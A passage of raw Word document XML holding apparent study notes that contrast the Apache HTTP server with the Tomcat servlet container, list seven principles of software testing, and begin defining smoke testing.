          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="327" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>an</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:b/>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">apache server is an http server which can serve any simple http requests, where tomcat server is actually a servlet container which can serve java </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:b/>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>servelt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:b/>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> requests.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="327" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Web server [apache] process web client (web browsers) requests and forwards it to servlet container [tomcat] and container process the requests and sends response which gets forwarded by web server to the web client [browser].</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="327" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Also you can check this link for more clarification:-</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:before="237" w:after="237" w:line="506" w:lineRule="atLeast"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">Well, Apache is HTTP webserver, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>where as</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve"> Tomcat is also webserver for Servlets and JSP. Moreover Apache is preferred over Apache Tomcat in real time</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:before="237" w:after="237" w:line="506" w:lineRule="atLeast"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">Apache is an HTTP web server it serve as HTTP but apache tomcat is an java servlet </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>container</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>,IT</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve"> FEATURES Same as web server customized to execute java servlet and JSP pages.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:before="237" w:after="237" w:line="506" w:lineRule="atLeast"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">Apache is the Apache Web Server also known as </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>httpd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>. See</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rStyle w:val="apple-converted-space"/>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
            <w:hyperlink r:id="rId18" w:history="1">
              <w:r w:rsidRPr="00584E67">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="7F3A21"/>
                  <w:sz w:val="22"/>
                  <w:szCs w:val="22"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>http://httpd.apache.org</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Tomcat is Apache Tomcat. See</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rStyle w:val="apple-converted-space"/>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
            <w:hyperlink r:id="rId19" w:history="1">
              <w:r w:rsidRPr="00584E67">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="7F3A21"/>
                  <w:sz w:val="22"/>
                  <w:szCs w:val="22"/>
                  <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                </w:rPr>
                <w:t>http://tomcat.apache.org</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="309" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>httpd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> is a web server whereas Tomcat is a Servlet Container. While at the simplest level both can be viewed as web servers that serve static files they have very different focuses. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>httpd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> is typically used to host static content and dynamic content written in </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>perl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>php</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:color w:val="222426"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> amongst others. Tomcat is primarily intended to be used to serve web applications developed in Java to the Java Servlet specification.</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblW w:w="0" w:type="auto"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:tblCellMar>
                <w:left w:w="0" w:type="dxa"/>
                <w:right w:w="0" w:type="dxa"/>
              </w:tblCellMar>
              <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
            </w:tblPr>
            <w:tblGrid>
              <w:gridCol w:w="243"/>
              <w:gridCol w:w="8886"/>
            </w:tblGrid>
            <w:tr w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidTr="004E3A7C">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:tcMar>
                    <w:top w:w="0" w:type="dxa"/>
                    <w:left w:w="0" w:type="dxa"/>
                    <w:bottom w:w="0" w:type="dxa"/>
                    <w:right w:w="237" w:type="dxa"/>
                  </w:tcMar>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
                  <w:pPr>
                    <w:spacing w:after="0" w:line="267" w:lineRule="atLeast"/>
                    <w:jc w:val="center"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="777777"/>
                      <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                    </w:rPr>
                    <w:lastRenderedPageBreak/>
                    <w:br/>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:tcBorders>
                    <w:top w:val="nil"/>
                    <w:left w:val="nil"/>
                    <w:bottom w:val="nil"/>
                    <w:right w:val="nil"/>
                  </w:tcBorders>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="004E3A7C">
                  <w:pPr>
                    <w:spacing w:after="79" w:line="240" w:lineRule="auto"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                  </w:pPr>
                  <w:hyperlink r:id="rId20" w:history="1">
                    <w:r w:rsidR="00033A77" w:rsidRPr="00584E67">
                      <w:rPr>
                        <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                        <w:color w:val="7F3A21"/>
                      </w:rPr>
                      <w:t>Apache Tomcat</w:t>
                    </w:r>
                  </w:hyperlink>
                  <w:r w:rsidR="00033A77" w:rsidRPr="00584E67">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="222426"/>
                    </w:rPr>
                    <w:t> is a Java servlet server as well as web server but it won't by default listen on port 80. Try http://localhost:8080.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="004E3A7C">
            <w:pPr>
              <w:spacing w:after="75" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="222426"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="0" w:name="_GoBack"/>
            <w:bookmarkEnd w:id="0"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Seven Principles of Software Testing</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Software testing is an extremely creative and intellectually challenging task. When testing follows the principles given below, the creative element of test design and execution rivals any of the preceding software development steps.</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1. Testing shows the presence of bugs</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Testing an application can only reveal that one or more defects exist in the application, however, testing alone cannot prove that the application is error free. Therefore, it is important to design test cases which find as many defects as possible.</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2. Exhaustive testing in impossible</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Unless the application under test (UAT) has a very simple logical structure and limited input, it is not possible to test all possible combinations of data and scenarios. For this reason, risk and priorities are used to concentrate on the most important aspects to test.</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3. Early testing</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The sooner we start the testing activities the better we can utilize the available time. As soon as the initial products, such the requirement or design documents are available, we can start testing. It is common for the testing phase to get squeezed at the end of the development lifecycle, i.e. when development has finished, so by starting testing early, we can prepare testing for each level of the development lifecycle.</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Another important point about early testing is that when defects are found earlier in the lifecycle, they are much easier and cheaper to fix. It is much cheaper to change an incorrect requirement than having to change </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a functionality</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in a large system that is not working as requested or as designed!</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4. Defect clustering</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During testing, it can be observed that most of the reported defects are related to small number of modules within a system. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i.e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. small number of modules contain most of the defects in the system. This is </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>the application of the Pareto Principle to software testing: approximately 80% of the problems are found in 20% of the modules.</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5. The pesticide paradox</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If you keep running the same set of tests over and over again, chances are no more new defects will be discovered by those test cases. Because as the system evolves, many of the previously reported defects will have been fixed and the old test cases do not apply anymore. Anytime a fault is fixed or a new functionality added, we need to do regression testing to make sure the new changed software has not broken any other part of the software. However, those regression test cases also need to change to reflect the changes made in the software to be applicable and hopefully fine new defects.</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6. Testing is context dependent</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Different methodologies, techniques and types of testing </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> related to the type and nature of the application. For example, a software application in a medical device needs more testing than </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a games</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> software. More importantly a medical device software requires risk based testing, be compliant with medical industry regulators and possibly specific test design techniques. By the same token, a very popular </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>website,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> needs to go through rigorous performance testing as well as functionality testing to make sure the performance is not affected by the load on the servers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="253" w:afterAutospacing="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>7. Absence of errors fallacy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00033A77" w:rsidRPr="00584E67" w:rsidRDefault="00033A77"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 xml:space="preserve">Just because testing didn’t find any defects in the software, it doesn’t mean that the software is ready to be shipped. Were the executed tests really designed to catch the most defects? </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> where they designed to see if the software matched the user’s requirements? There are many other factors to be considered before making a decision to ship the software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D857E6" w:rsidRPr="00584E67" w:rsidRDefault="00D857E6" w:rsidP="00033A77">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Smoke Testing: </w:t>
      </w:r>
      <w:r w:rsidR="00B95B28" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">scertain that the critical functionalities of the program </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> working fine t</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:b w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>purpose is to reject a badly broken application</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00D37992" w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00D37992" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
